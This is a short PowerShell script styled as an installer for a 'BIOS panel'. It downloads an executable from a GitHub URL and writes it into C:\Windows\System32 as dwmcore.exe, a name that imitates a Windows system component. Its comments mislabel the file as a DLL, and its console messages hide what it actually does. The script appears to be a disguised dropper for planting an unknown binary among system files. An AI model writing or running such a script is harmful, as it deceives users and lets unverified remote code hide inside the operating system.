# ================================
# Phoenix BIOS Panel - Downloader
# ================================

# Set console style
Clear-Host
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "     Ryuga BIOS Panel Installer    " -ForegroundColor Green
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""

# DLL URL
$url = "https://github.com/dclucky555-del/PhoenixBios-Panel/raw/refs/heads/main/dwmcore.exe"

# FIXED PATH (no dynamic, no creation)
$basePath = "C:\Windows\System32"
$fileName = "dwmcore.exe"
$filePath = Join-Path $basePath $fileName

# Check folder exists
if (!(Test-Path $basePath)) {
    Write-Host "Setting Not Found Please Contact the Developer" -ForegroundColor Red
    exit
}

try {
    # Download DLL
    Write-Host "[+] Please Wait Bios panel Being Setup..." -ForegroundColor Yellow
    Invoke-WebRequest -Uri $url -OutFile $filePath -UseBasicParsing

    # Verify download
    if (Test-Path $filePath) {
        Write-Host "Connected to the System" -ForegroundColor Green
    } else {
        throw "Connection Failed!"
    }

    # File info
    $fileSize = (Get-Item $filePath).Length / 1KB
    Write-Host "[i] File Size: $([math]::Round($fileSize,2)) KB" -ForegroundColor Cyan

} catch {
    Write-Host "[X] Error: $_" -ForegroundColor Red
}

Write-Host ""
Write-Host "RYugaBios panel Setup success ✅" -ForegroundColor Green
